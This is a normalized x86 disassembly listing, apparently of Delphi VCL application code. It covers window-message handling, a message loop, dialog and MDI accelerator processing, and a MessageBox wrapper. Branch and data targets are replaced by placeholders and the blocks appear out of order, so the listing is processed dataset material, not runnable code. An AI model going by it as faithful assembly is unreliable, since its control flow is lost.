cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45de4c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45ca3c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45c9e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_443708
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c504
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45b2b8
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45bd78
pop ecx
jmp [ eax * 4 + jump_table_45bea4 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_443708
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45c8b8
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4480a4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45bd0c
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41988c
jmp r-xdata
xor eax eax
call sub_453c38
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_443708
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43e0d4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c520
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45bd78
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4594b8
jmp r-xdata
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
push ebp
call sub_45bdb4
pop ecx
jmp r-xdata
push ebp
call sub_45bd78
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c5d0
jmp r-xdata
jmp r-xdata
call sub_42f548
call sub_42f628
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc08
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc18
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc10
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453ae8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
call sub_453b9c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45bd78
pop ecx
jmp r-xdata
call sub_42f548
call sub_42f684
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d31c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45c520
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45bc08
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45b538
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_443708
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_443708
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45c5d0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45b538
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_443708
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45bc18
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_443708
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_457244
mov eax [ ebx + 0x44 ]
call sub_459660
sub_45c6d0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45c70c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ffc
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404098
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45c758
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45c77c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45c7cc
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_439dac
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_443708
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45c884
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45d7e4
sub_45c8b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_443708
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403454
test al al
jne r-xdata
sub_45c924
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45c884
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45c77c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45c7cc
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45c758
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45c9bc
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45c924
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45d28c
sub_45c9e0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413f24
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413de8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45ca3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413f44
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413e34
jmp r-xdata
sub_45cad0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_45cb0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4436e4
mov [ esi + 0x44 ] edi
sub_45cb50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45cc2e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_453a60
call sub_407bc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cc35
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_457244
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4036f8#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45c9bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_45614c
mov eax [ ebp - 0x4 ]
call sub_45c520
jmp r-xdata
sub_45cc50
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b630
call sub_40274c
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_45ce48
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45cce0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_453ae8
mov [ ebp - 0x10 ] eax
call sub_453a04
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45bc84
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45ce35
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce3c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_453b9c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_453a0c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45ce48
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cf03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404040
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45c70c
mov eax [ ebp - 0x108 ]
call sub_404468
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
mov edx eax
mov eax ebx
pop ecx
call sub_45cce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cf0a
lea eax [ ebp - 0x108 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
call sub_40852c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d58
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b70
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404270
sub_45cf20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_4438a4
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_443a0c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45d5c4
test al al
je r-xdata
call sub_443708
mov ebp eax
mov eax edi
call sub_443708
mov ebp eax
mov eax esi
call sub_45d5c4
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45d088
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45d0e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45d5c4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45de10
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d0e7
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_45d0f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45d148
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45d5c4
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45de10
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d14f
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_45d160
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403258
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43d0c0
jmp r-xdata
sub_45d1b0
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45a75c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_443708
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a748
mov ebx eax
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax ebx
call sub_443708
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45d214
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43b7cc
mov edi eax
call sub_43a0c8
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
